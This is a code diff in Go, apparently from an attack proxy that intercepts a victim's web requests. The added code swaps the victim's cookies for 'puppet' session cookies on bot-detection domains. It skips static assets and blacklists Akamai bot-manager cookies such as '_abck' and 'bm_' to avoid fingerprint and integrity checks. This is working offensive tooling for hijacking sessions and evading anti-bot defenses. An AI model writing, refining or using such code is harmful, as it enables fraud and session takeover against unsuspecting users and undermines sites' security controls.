@@ -196,7 +196,22 @@ func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID stri
 // injectPuppetCookies replaces victim cookies with puppet cookies for bot-detection domains
 func (ri *RequestInterceptor) injectPuppetCookies(req *http.Request, sessionID string) *http.Request {
 	cookies := ri.puppetMaster.sessionMap.GetCookies(sessionID)
+	// request.
 	if cookies == nil {
+		return req
+	}
+
+	// Skip static assets to avoid breaking caching or triggering integrity checks
+	// Akamai often POSTs for JS files, injecting session cookies there might cause issues.
+	path := strings.ToLower(req.URL.Path)
+	if strings.HasSuffix(path, ".js") || 
+	   strings.HasSuffix(path, ".css") || 
+	   strings.HasSuffix(path, ".png") || 
+	   strings.HasSuffix(path, ".jpg") || 
+	   strings.HasSuffix(path, ".svg") || 
+	   strings.HasSuffix(path, ".woff") || 
+	   strings.HasSuffix(path, ".woff2") || 
+	   strings.HasSuffix(path, ".ico") {
 		return req
 	}
 
@@ -204,9 +219,26 @@ func (ri *RequestInterceptor) injectPuppetCookies(req *http.Request, sessionID s
 	
 	// Track critical cookies to replace
 	criticalCookies := map[string]string{}
+	// Blacklist of cookies NOT to inject (let victim use their own)
+	// Akamai & Sensor cookies are bound to TLS fingerprint
+	blacklist := []string{"_abck", "bm_", "ak_bm", "Optanon", "amplitude_", "mbox", "RT", "s_cc", "s_sq"} 
+
 	for _, c := range cookies {
 		name, _ := c["name"].(string)
 		value, _ := c["value"].(string)
+		
+		// Skip blacklisted cookies
+		skip := false
+		for _, b := range blacklist {
+			if strings.HasPrefix(name, b) {
+				skip = true
+				break
+			}
+		}
+		if skip {
+			continue
+		}
+
 		if name != "" {
 			criticalCookies[name] = value
 		}
